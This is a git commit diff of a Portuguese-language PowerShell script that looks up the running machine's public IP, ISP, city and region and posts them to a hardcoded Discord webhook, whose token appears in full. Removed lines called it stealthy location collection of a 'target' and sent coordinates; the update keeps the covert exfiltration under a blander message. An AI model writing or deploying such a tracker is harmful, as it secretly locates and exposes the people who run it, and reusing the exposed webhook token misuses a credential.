2383e6de1bd1639d8209147169abf2f793940edc
arthurboby <arthurlourencopaixao57@gmail.com>
2026-05-18 00:59:36 -0300

    Update ip_info.ps1

--- coleta/ip_info.ps1
+++ coleta/ip_info.ps1
@@ -1,14 +1,7 @@
-# Coleta de IP e Localização Furtiva
 $webhook = "https://discord.com/api/webhooks/1505693050175885342/6LSI1HJR2XcmSAgBP2c-C5wnDhd6CHqh9vBIxIxr6l7ExhN0S2Eiyj4vEAmoL0kQlGkL"
 $info = Invoke-RestMethod -Uri "http://ip-api.com"
-
 $msg = @{
-    content = "📍 **Localização do Alvo Detectada:**`n" +
-              "🌐 **IP:** $($info.query)`n" +
-              "🏢 **Provedor:** $($info.isp)`n" +
-              "📍 **Cidade:** $($info.city) / $($info.regionName)`n" +
-              "🌎 **Coordenadas:** $($info.lat), $($info.lon)"
+    content = "🌐 **IP Detectado:** $($info.query)`n📍 **Local:** $($info.city), $($info.regionName)`n🏢 **ISP:** $($info.isp)"
 } | ConvertTo-Json
-
 Invoke-RestMethod -Uri $webhook -Method Post -Body $msg -ContentType "application/json"
-Write-Host "Localização enviada ao Discord!" -ForegroundColor Green
+Write-Host "Informações de rede enviadas!" -ForegroundColor Green
